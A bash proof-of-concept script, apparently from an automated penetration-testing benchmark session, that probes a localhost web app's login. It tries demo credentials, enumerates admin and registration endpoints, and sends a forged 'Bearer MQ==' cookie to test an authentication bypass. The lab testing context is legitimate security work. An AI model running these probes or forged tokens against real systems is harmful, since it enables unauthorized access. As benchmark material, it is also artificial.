#!/bin/bash
# POC: Comprehensive test to verify authentication system state and determine if bypass is complete or partial
# Target: ./repo
# Created: 2025-11-10T14:52:32.608Z
# Session: benchmark-XBEN-021-24-mht8yjkr

TARGET="http://localhost:8080"

echo "=========================================="
echo "Complete Authentication System Analysis"
echo "=========================================="
echo ""

# Test 1: Get the login page to understand the app
echo "[TEST 1] Fetching login page..."
curl -s "$TARGET/" | grep -o "username\|password\|demo" | head -5
echo ""

# Test 2: Try POST to /token with demo credentials - capture headers and full response
echo "[TEST 2] POST to /token with demo/demo..."
echo "Headers:"
curl -s -i -X POST "$TARGET/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo" | head -20
echo ""
echo ""

# Test 3: Test with different content type
echo "[TEST 3] POST with form-data encoding..."
curl -s -i -X POST "$TARGET/token" \
  -F "username=demo" \
  -F "password=demo" | head -20
echo ""
echo ""

# Test 4: Check if there's a /users or /admin endpoint
echo "[TEST 4] Checking for alternative endpoints..."
for endpoint in /users /user /admin /api /profiles /companies /data; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
    echo "GET $endpoint -> HTTP $STATUS"
done
echo ""

# Test 5: Try to access root with token
echo "[TEST 5] Checking if we can bypass auth with no token..."
RESPONSE=$(curl -s "$TARGET/")
if echo "$RESPONSE" | grep -q "login\|Login"; then
    echo "Root redirects to login - app requires auth"
else
    echo "Root accessible without auth"
    echo "Response snippet: $(echo "$RESPONSE" | head -c 200)"
fi
echo ""

# Test 6: See if there's a way to register/create account
echo "[TEST 6] Looking for registration or user creation..."
for endpoint in /register /signup /create-account /api/users /api/register; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
    if [ "$STATUS" != "404" ]; then
        echo "Found: $endpoint -> HTTP $STATUS"
    fi
done
echo ""

# Test 7: Check token endpoint response code more carefully
echo "[TEST 7] Detailed token endpoint analysis..."
curl -s -w "\nHTTP Status: %{http_code}\n" -X POST "$TARGET/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo" | tail -5
echo ""

# Test 8: Try with actual token format (Bearer base64)
echo "[TEST 8] Attempting with Bearer token in cookie..."
curl -s -i -X GET "$TARGET/" \
  -H "Cookie: user_token=Bearer MQ==" | grep -i "set-cookie\|location\|302\|200"
echo ""

echo "=========================================="
echo "CONCLUSION: Testing authentication bypass claims"
echo "=========================================="